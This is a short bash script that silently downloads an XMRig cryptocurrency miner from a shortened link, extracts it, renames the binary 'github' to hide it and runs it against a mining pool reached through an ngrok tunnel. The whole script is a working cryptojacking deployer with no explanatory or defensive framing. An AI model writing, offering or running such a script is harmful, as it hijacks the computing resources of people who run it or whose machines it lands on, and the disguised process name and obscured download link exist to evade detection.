#!/bin/bash
wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
cd xmrig-6.16.4
mv xmrig github
chmod u+x github
./github --url 0.tcp.ap.ngrok.io:18192
